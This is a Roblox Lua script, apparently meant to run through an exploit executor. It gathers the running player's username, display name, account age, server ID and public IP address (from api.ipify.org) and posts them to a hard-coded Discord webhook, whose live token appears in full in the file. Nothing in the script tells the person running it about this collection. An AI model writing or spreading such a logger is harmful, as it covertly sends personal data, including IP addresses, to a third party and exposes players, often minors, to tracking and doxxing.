-- Replace this URL with your Discord webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1212487312873885716/76arKjYim_SIBRs6cTjnI7_ynKjEjdNp3H9DI5BbYisFQ42CBJHPYZnmG62TkeGJhdrD"

local player = game.Players.LocalPlayer
local username = player.Name
local accountAge = player.AccountAge
local gameUsername = player.DisplayName
local serverId = game.JobId
local avatarUrl = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username=" .. username

-- Retrieve IP address
local ip = game:HttpGet("https://api.ipify.org")

-- Prepare data for the POST request
local data = {
    username = "The Rake",
    avatar_url = avatarUrl,
    content = nil,
    embeds = {
        {
            title = "Script Has Been Executed!",
            description = "Username: " .. username .. "\nGame Username: " .. gameUsername .. "\nIP Address: " .. tostring(ip) .. "\nAccount Age: " .. accountAge .. "\nServer ID: " .. serverId,
            color = nil
        }
    }
}

-- Convert data to JSON
local jsonData = game:GetService("HttpService"):JSONEncode(data)

-- Set up headers
local headers = {
    ["Content-Type"] = "application/json"
}

-- Make the HTTP request
local httpRequest = syn and (syn.request or http.request) or http_request or request or httprequest

if httpRequest then
    local response = httpRequest({
        Url = webhookUrl,
        Method = "POST",
        Headers = headers,
        Body = jsonData
    })

    -- Optionally, you can print the response to check for errors
    print(response.Body)
else
    warn("HTTP request not available.")
end
